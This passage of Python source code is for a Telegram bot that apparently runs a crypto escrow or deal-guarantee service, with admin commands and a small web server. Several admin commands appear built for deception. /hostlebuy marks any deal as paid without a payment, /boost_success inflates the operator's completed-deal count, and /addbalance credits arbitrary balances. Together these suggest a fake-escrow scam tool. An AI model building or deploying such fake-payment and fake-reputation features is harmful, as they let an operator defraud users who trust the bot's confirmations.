    value = message.text.strip()
    if not validate_usdt(value):
        await message.answer(get_text(user_id, 'requisites_edit_invalid'))
        return
    save_user_requisites(user_id, {'usdt': value})
    await state.clear()
    await show_requisites(message, user_id)
    log_action(user_id, "edit_requisites", f"usdt обновлён")

@dp.message(RequisitesEdit.waiting_btc)
async def process_btc(message: Message, state: FSMContext):
    user_id = message.from_user.id
    value = message.text.strip()
    if not validate_btc(value):
        await message.answer(get_text(user_id, 'requisites_edit_invalid'))
        return
    save_user_requisites(user_id, {'btc': value})
    await state.clear()
    await show_requisites(message, user_id)
    log_action(user_id, "edit_requisites", f"btc обновлён")

# ---------- Админ-панель ----------
ADMIN_ID = 8297446667

@dp.message(Command("hyteam"))
async def cmd_hyteam(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    await send_with_banner(message, get_text(user_id, 'admin_panel'))
    log_action(user_id, "hyteam", "открытие админ-панели")

@dp.message(Command("addbalance"))
async def cmd_addbalance(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    args = message.text.split()
    if len(args) < 3:
        await message.answer(get_text(user_id, 'addbalance_fail'))
        return
    try:
        target_user_id = int(args[1])
        amount = float(args[2].replace(',', '.'))
    except ValueError:
        await message.answer(get_text(user_id, 'addbalance_fail'))
        return
    if target_user_id not in user_balance:
        await message.answer(get_text(user_id, 'addbalance_user_not_found').format(user=target_user_id))
        return
    user_balance[target_user_id] = user_balance.get(target_user_id, 0.0) + amount
    new_balance = user_balance[target_user_id]
    await message.answer(get_text(user_id, 'addbalance_success').format(
        user=target_user_id,
        amount=amount,
        new_balance=new_balance
    ))
    log_action(user_id, "addbalance", f"пользователю {target_user_id} +{amount} TON")

@dp.message(Command("vvteam"))
async def cmd_vvteam(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    if not withdraw_requests:
        await send_with_banner(message, get_text(user_id, 'admin_withdraw_empty'))
        return
    list_text = ""
    for idx, req in enumerate(withdraw_requests):
        if req['status'] != 'pending':
            continue
        list_text += f"{idx+1}. Пользователь {req['user_id']}, сумма {req['amount']} TON, реквизиты: {req['requisites']}\n"
    if not list_text:
        await send_with_banner(message, get_text(user_id, 'admin_withdraw_empty'))
        return
    text = get_text(user_id, 'admin_withdraw_list').format(list=list_text)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Обновить", callback_data="refresh_admin")]
    ])
    await send_with_banner(message, text, keyboard)

@dp.callback_query(lambda c: c.data == "refresh_admin")
async def cb_refresh_admin(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Нет доступа", show_alert=True)
        return
    await cmd_vvteam(callback.message)
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("confirm_withdraw_"))
async def cb_confirm_withdraw(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if not is_admin(user_id):
        await callback.answer("Нет доступа", show_alert=True)
        return
    idx = int(callback.data.split("_")[2])
    if idx >= len(withdraw_requests) or withdraw_requests[idx]['status'] != 'pending':
        await callback.answer("Заявка уже обработана или не существует", show_alert=True)
        return
    req = withdraw_requests[idx]
    req['status'] = 'completed'
    await callback.message.answer(get_text(ADMIN_ID, 'admin_withdraw_confirm').format(amount=req['amount'], user=req['user_id']))
    await callback.answer("Подтверждено")
    await cmd_vvteam(callback.message)
    log_action(user_id, "confirm_withdraw", f"подтверждена заявка {idx+1}")

@dp.message(Command("chat"))
async def cmd_chat(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.answer("Использование: /chat [@user или id] [текст]")
        return
    target_str = args[1]
    text = args[2]
    target_user_id = None
    if target_str.startswith('@'):
        for uid, deals in user_deals.items():
            if deals and deals[0].get('buyer') == target_str[1:]:
                target_user_id = uid
                break
            if deals and deals[0].get('seller') == target_str[1:]:
                target_user_id = uid
                break
    else:
        try:
            target_user_id = int(target_str)
        except:
            pass
    if not target_user_id:
        await message.answer(get_text(user_id, 'chat_no_deal'))
        return
    if target_user_id not in user_deals or not user_deals[target_user_id]:
        await message.answer(get_text(user_id, 'chat_no_deal'))
        return
    try:
        await bot.send_message(target_user_id, f"Сообщение от поддержки:\n{text}")
        await message.answer(get_text(user_id, 'chat_success'))
        log_action(user_id, "chat", f"пользователю {target_user_id}: {text}")
    except Exception as e:
        await message.answer(get_text(user_id, 'chat_fail'))
        logging.error(f"Chat error: {e}")

@dp.message(Command("hostlebuy"))
async def cmd_hostlebuy(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /hostlebuy [код сделки]")
        return
    code = args[1]
    found = False
    for uid, deals in user_deals.items():
        for deal in deals:
            if deal['code'] == code:
                if deal.get('paid'):
                    await message.answer(get_text(user_id, 'hostlebuy_fail'))
                    return
                deal['paid'] = True
                found = True
                break
        if found:
            break
    if found:
        await message.answer(get_text(user_id, 'hostlebuy_success').format(code=code))
        log_action(user_id, "hostlebuy", f"код {code}")
    else:
        await message.answer(get_text(user_id, 'hostlebuy_fail'))

@dp.message(Command("ref"))
async def cmd_ref(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /ref [код сделки]")
        return
    code = args[1]
    found = False
    for uid, deals in user_deals.items():
        for deal in deals:
            if deal['code'] == code:
                found = True
                break
        if found:
            break
    if found:
        await message.answer(get_text(user_id, 'ref_success').format(code=code))
        log_action(user_id, "ref", f"код {code}")
    else:
        await message.answer(get_text(user_id, 'ref_fail'))

@dp.message(Command("boost_success"))
async def cmd_boost(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    args = message.text.split()
    if len(args) < 2:
        await message.answer(get_text(user_id, 'boost_fail'))
        return
    try:
        num = int(args[1])
    except:
        await message.answer(get_text(user_id, 'boost_fail'))
        return
    user_completed_deals[user_id] = user_completed_deals.get(user_id, 0) + num
    await message.answer(get_text(user_id, 'boost_success').format(num=num))
    log_action(user_id, "boost_success", f"+{num}")

@dp.message(Command("giveadmin"))
async def cmd_giveadmin(message: types.Message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    args = message.text.split()
    if len(args) < 3:
        await message.answer("Использование: /giveadmin [@user или id] [1m|1h|1d|1w|1M|1y]")
        return
    target_str = args[1]
    time_str = args[2]
    multipliers = {'m': 60, 'h': 3600, 'd': 86400, 'w': 604800, 'M': 2592000, 'y': 31536000}
    if time_str[-1] not in multipliers:
        await message.answer(get_text(user_id, 'giveadmin_fail'))
        return
    try:
        value = int(time_str[:-1])
    except:
        await message.answer(get_text(user_id, 'giveadmin_fail'))
        return
    duration = value * multipliers[time_str[-1]]
    expiry = time.time() + duration
    target_user_id = None
    if target_str.startswith('@'):
        target_user_id = None
    else:
        try:
            target_user_id = int(target_str)
        except:
            pass
    if not target_user_id:
        await message.answer("Пользователь не найден.")
        return
    temp_admins[target_user_id] = expiry
    await message.answer(get_text(user_id, 'giveadmin_success').format(user=target_user_id, time_str=time_str))
    log_action(user_id, "giveadmin", f"пользователю {target_user_id} на {time_str}")

@dp.message(Command("logs"))
async def cmd_logs(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(get_text(user_id, 'admin_no_access'))
        return
    if not logs:
        await message.answer(get_text(user_id, 'logs_empty'))
        return
    header = get_text(user_id, 'logs_header')
    entries = []
    for log in logs[-20:]:
        entries.append(get_text(user_id, 'logs_entry').format(
            time=log['time'],
            user=log['user'],
            action=log['action'],
            data=log['data']
        ))
    text = header + "\n".join(entries)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
    ])
    await send_with_banner(message, text, keyboard)
    log_action(user_id, "logs", "просмотр логов")

# ---------- HTTP-сервер ----------
async def health_check(request):
    return web.Response(text="OK")

async def start_web_server():
    port = int(os.environ.get("PORT", 10000))
    app = web.Application()
    app.router.add_get("/", health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host="0.0.0.0", port=port)
    await site.start()
    logging.info(f"Web server started on port {port}")

async def main():
    asyncio.create_task(start_web_server())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
